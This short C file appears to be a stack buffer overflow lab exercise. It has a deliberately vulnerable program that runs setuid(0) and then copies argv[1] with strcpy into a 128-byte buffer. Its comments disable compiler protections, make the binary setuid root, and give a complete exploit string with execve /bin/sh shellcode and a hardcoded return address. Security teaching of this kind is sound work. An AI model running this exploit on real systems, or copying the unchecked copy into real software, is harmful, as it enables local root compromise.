// AFTER => bof6.c
//       => shellcode.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 128

// COMPILE $ gcc -z execstack -fno-stack-protector bof7.c -o bof7
// SETUID  $ sudo chown root:root bof7
//         $ sudo chmod 4755 bof7
// EXPLOIT $ ./bof7 `py2 -c "print('\x90'*10+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'a'*99+'\xd0\xe2\xff\xff\xff\x7f')"`

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fputs("\033[31m" "error :( this program needs some arguments\n" "\033[0m", stderr);
        return 1;
    }
    char buf[BUF_SIZE];

    if (setuid(0)) {
        perror("setuid");
        return 1;
    }

    strcpy(buf, argv[1]);
    printf("Hello %s[%p]!\n", buf, buf);

    return 0;
}
